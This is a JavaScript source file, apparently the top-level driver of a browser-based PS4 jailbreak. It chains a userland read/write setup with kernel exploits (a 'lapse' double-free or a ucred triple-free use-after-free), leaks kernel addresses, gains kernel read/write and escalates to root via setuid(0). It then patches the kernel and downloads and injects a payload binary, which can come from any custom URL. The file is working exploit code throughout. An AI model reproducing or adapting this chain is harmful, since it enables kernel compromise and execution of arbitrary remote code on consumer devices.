let scriptsLoaded = false;

async function ensureScriptsLoaded() {
  if (scriptsLoaded) return;
  await load_script("src/misc.js");
  await load_script("src/ps4/constants.js");
  await load_script("src/ps4/userland.js");
  await load_script("src/loader.js");
  await load_script("src/workers.js");
  await load_script("src/ps4/kernel.js");
  await load_script(`src/${exploitChain}.js`);
  scriptsLoaded = true;
}

async function doJb(customPayloadUrl = null) {
  await ensureScriptsLoaded();

  try {
    version.init();

    logger.info("===USERLAND===");

    let rw = undefined;
    if (arw.master === undefined) {
      rw = await init_rw();
    }

    init_arw(rw);
    init_rop();
    init_syscalls();

    logger.info("===END===");

    logger.info(`===${exploitChain.toUpperCase()}===`);

    try {
      if (exploitChain == "lapse") {
        init();
        await setup();
        await double_free_reqs2();
        leak_kaddrs();
        double_free_reqs1();
        make_karw();

        inc_karw_pipe_refcnt();

        logger.info("Corrupted context cleanup started...");

        remove_pktinfo_from_so(pktopts_twins[0]);
        remove_rthdr_from_so(pktopts_twins[1]);
        remove_rthdr_from_so(rthdr_twins[0]);

        logger.info("Corrupted context cleanup completed !!");
      } else {
        init();
        await setup();
        await ucred_triple_free();
        leak_kqueue();
        await make_karw();

        inc_karw_pipe_refcnt();

        logger.info("Corrupted context cleanup started...");

        for (let i = 0; i < triplets.length; i++) {
          remove_rthdr_from_so(triplets[i]);
        }

        remove_uaf_file();

        logger.info("Corrupted context cleanup completed !!");
      }
    } finally {
      cleanup();
    }

    find_all_proc();

    const setuidResult = fn.setuid.invoke(0);
    logger.info(`setuid(0) result: ${setuidResult} (${setuidResult === 0 ? 'already root' : 'not root'})`);

    // Always load payload if customPayloadUrl provided (for switching HENs)
    // Otherwise only load if not already root
    const shouldLoadPayload = customPayloadUrl || setuidResult === -1;
    
    if (shouldLoadPayload) {
      if (setuidResult === -1) {
        logger.info("Not root, applying jailbreak...");
        jailbreak();

        const kpatches_rsp = await fetch(`src/ps4/patches/${constants.KPATCH}`);
        const kpatches_buf = await kpatches_rsp.arrayBuffer();
        const kpatches_u8 = new Uint8Array(kpatches_buf);

        kernel_patches(kpatches_u8);
        logger.info("Kernel patches applied");
      } else {
        logger.info("Already root, but custom payload requested - reloading payload...");
      }

      let bin_u8;
      if (customPayloadUrl) {
        logger.info(`Downloading custom payload from ${customPayloadUrl}...`);
        try {
          const bin_rsp = await fetch(customPayloadUrl, { cache: "no-cache", mode: "cors", credentials: "omit" });
          logger.info(`Fetch response: ${bin_rsp.status} ${bin_rsp.statusText}`);
          if (!bin_rsp.ok) {
            throw new Error(`Failed to download payload: ${bin_rsp.status} ${bin_rsp.statusText}`);
          }
          const bin_buf = await bin_rsp.arrayBuffer();
          bin_u8 = new Uint8Array(bin_buf);
          logger.info(`Custom payload downloaded (${bin_u8.length} bytes)`);
          if (bin_u8.length > 4) {
            logger.info(`Payload first bytes: ${bin_u8[0].toString(16)} ${bin_u8[1].toString(16)} ${bin_u8[2].toString(16)} ${bin_u8[3].toString(16)}`);
          }
        } catch (e) {
          logger.error(`Payload download failed: ${e.message}`);
          logger.error(`Stack: ${e.stack}`);
          throw e;
        }
      } else {
        const bin_rsp = await fetch("src/payload.bin");
        const bin_buf = await bin_rsp.arrayBuffer();
        bin_u8 = new Uint8Array(bin_buf);
        logger.info(`Local payload.bin loaded (${bin_u8.length} bytes)`);
      }

      logger.info("Loading payload...");
      load_bin(bin_u8);
      logger.info("Payload loaded successfully!");
    } else {
      logger.info("Already root (jailbreak active), skipping payload injection");
      logger.info("If you want to reinject payload, please reboot the console first");
    }

    logger.info("===END===");
  } catch (e) {
    logger.error(e.message);
    logger.error(e.stack);
  }
}
